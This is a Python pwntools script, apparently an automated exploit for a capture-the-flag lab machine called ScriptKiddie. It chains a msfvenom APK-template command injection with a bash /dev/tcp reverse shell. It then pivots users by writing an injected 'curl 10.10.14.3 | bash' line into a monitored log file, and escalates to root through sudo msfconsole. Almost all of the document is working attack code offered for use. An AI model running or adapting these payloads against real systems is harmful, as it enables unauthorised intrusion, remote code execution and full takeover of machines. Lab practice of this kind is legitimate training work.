#!/usr/bin/python3

from pwn import *
import signal,sys,requests,pdb,threading

#Ctrl+C 
def def_handler(sig, frame):
    print("Saliendo...")
    sys.exit(1)

signal.signal(signal.SIGINT,def_handler)

#Variables globales
url = "http://10.10.10.226:5000/"
burp = {'http': 'http://localhost:8080'}

def makeRequest():

    content = open("evil.apk", "rb")
    file_to_upload = {'template':('evil.apk',content,'application/vnd.android.package-archive')}
    

    data = {
            'os': 'android',
            'lhost': '10.10.14.3',
            'action': 'generate'
            }
    r = requests.post(url, files = file_to_upload, data=data) 

if __name__ == '__main__':
    print("It is necessary to have an open http server (python3 -m http.server 80) sharing an index.html file with the following code: bash -i >& /dev/tcp/10.10.14.3/443 0>&1")
    p1 = log.progress("ScriptKiddie autopwn to root user")
    p1.status("msfvenom APK template command injection exploitation (msf 6.0.11)")
    time.sleep(2)
    
    try:
        threading.Thread(target=makeRequest, args=()).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(443, timeout=20).wait_for_connection()

    if shell.sock is None:
        p1.failure("Connection couldn't be stablished")
        sys.exit(1)
    else:
        p1.status("Shell gained as 'kid' user")
        sleep(2)
        p1.status("Pivoting to pwn user")
        try: 
            threading.Thread(target=shell.sendline(b"echo 'x x 127.0.0.1; curl 10.10.14.3 | bash' > /home/kid/logs/hackers"),args=()).start()
        except Exception as e:
            log.error(str(e))

        shell = listen(443, timeout=20).wait_for_connection()

        if shell.sock is None:
            p1.failure("Connection couldn't be stablished")
            sys.exit(1)
        else:
            p1.status("Gained shell as pwn")
            sleep(2)
            p1.status("Gaining shell as root")
            shell.sendline(b"sudo /opt/metasploit-framework-6.0.9/msfconsole -x bash")
            sleep(5)
            shell.interactive() 

